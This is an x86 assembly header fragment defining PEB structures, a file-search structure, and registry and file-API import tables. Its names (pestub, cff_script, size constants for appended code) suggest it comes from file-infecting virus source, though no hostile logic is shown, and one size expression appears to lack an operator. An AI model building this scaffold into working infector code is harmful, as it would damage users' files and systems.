SPPEnable                equ     78h
CFFASIZE                 equ     ((((offset cff_ansibuff - offset code_begin) * 5) - 1) + (((offset pestub_end - offset pestub) * 5) - 1) (offset cff_scriptend - offset cff_script) + 0dh)
ADDSIZE                  equ     CFFASIZE * 2
                                             ;Unicode version size
                                             
LIST_ENTRY struct
    FLink  dd ?
    BLink  dd ?
LIST_ENTRY ends

_PEB_LDR_DATA struct
    dwLength                           dd ?
    bInitialized                       dd ?
    dwSsHandle                         dd ?
    dwInLoadOrderModuleList            LIST_ENTRY <?>
    dwInMemoryOrderModuleList          LIST_ENTRY <?>
    dwInInitializationOrderModuleList  LIST_ENTRY <?>
_PEB_LDR_DATA ends

PROCESS_ENVIRONMENT_BLOCK struct
	bInhiritedAddressSpace     db ?
	bReadImageFileExecOptions  db ?
	bBeingDebugged             db ?
	bSpare                     db ?
	hMutant                    dd ?
	dwImageBaseAddress         dd ?
	lpLoaderData               dd ?
	lpProcessParameters        dd ?
PROCESS_ENVIRONMENT_BLOCK ends

WIN32_FIND_DATAW struct
    dwFileAttributes dd ?
    ftCreationTime   dq ?
    ftLastAccessTime dq ?
    ftLastWriteTime  dq ?
    nFileSizeHigh    dd ?
    nFileSizeLow     dd ?
    dwReserved0      dd ?
    dwReserved1      dd ?
    cFileName        dw 260 dup (0)
    cAlternate       dw 0eh dup (0)
WIN32_FIND_DATAW ends

advapi32 struct
    aRegSetValueExA  dd ?
    aRegQueryKeyExA  dd ?
    aRegOpenKeyExA   dd ?
    aRegCloseKey     dd ?
advapi32 ends

kernel32 struct   
    kWriteFile            dd ?
    kSetFileAttributesW   dd ?
    kReadFile             dd ?
    kLoadLibraryA         dd ?
    kGlobalFree           dd ?
    kGlobalAlloc          dd ?
    kFindNextFileW        dd ?
    kFindFirstFileW       dd ?
    kFindClose            dd ?
    kCreateFileW          dd ?
    kCloseHandle          dd ?
kernel32 ends
